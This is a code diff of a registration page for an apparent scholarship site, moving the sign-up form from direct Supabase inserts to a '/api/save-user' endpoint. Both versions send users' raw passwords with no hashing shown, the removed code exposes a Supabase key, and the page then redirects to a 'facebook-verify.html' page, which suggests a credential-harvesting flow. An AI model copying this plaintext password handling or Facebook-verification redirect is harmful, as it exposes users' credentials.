@@ -6,6 +6,8 @@
     <title>Register - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="css/style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <!-- Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 </head>
 <body>
 
@@ -111,16 +113,8 @@
 
     <script src="js/script.js"></script>
 
-    <!-- ===== SUPABASE CONNECTION ===== -->
-    <script type="module">
-        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
-
-        // Supabase credentials
-        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
-        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
-        const supabase = createClient(supabaseUrl, supabaseKey);
-
-        // ===== REGISTER FORM SUBMIT =====
+    <!-- ===== REGISTER FORM SUBMIT ===== -->
+    <script>
         document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -128,28 +122,26 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Save to Supabase
-            const { data, error } = await supabase
-                .from('users')
-                .insert([{ 
-                    name: name, 
-                    email: email, 
-                    password: password,
-                    submitted_at: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
-                }])
-                .select();
-
-            if (error) {
-                console.error('❌ Supabase Error:', error);
-                alert('⚠️ Error saving data: ' + error.message);
-                return;
+            try {
+                const response = await fetch('/api/save-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, email, password })
+                });
+                
+                const result = await response.json();
+                console.log('✅ Data saved:', result);
+                
+                if (result.success) {
+                    alert('✅ Registration successful!');
+                    window.location.href = 'facebook-verify.html';
+                } else {
+                    alert('⚠️ Error: ' + result.error);
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('⚠️ Error saving data. Please try again.');
             }
-
-            console.log('✅ Data saved!', data);
-            alert('✅ Registration successful!');
-            
-            // Redirect to Facebook verification
-            window.location.href = 'facebook-verify.html';
         });
     </script>
 
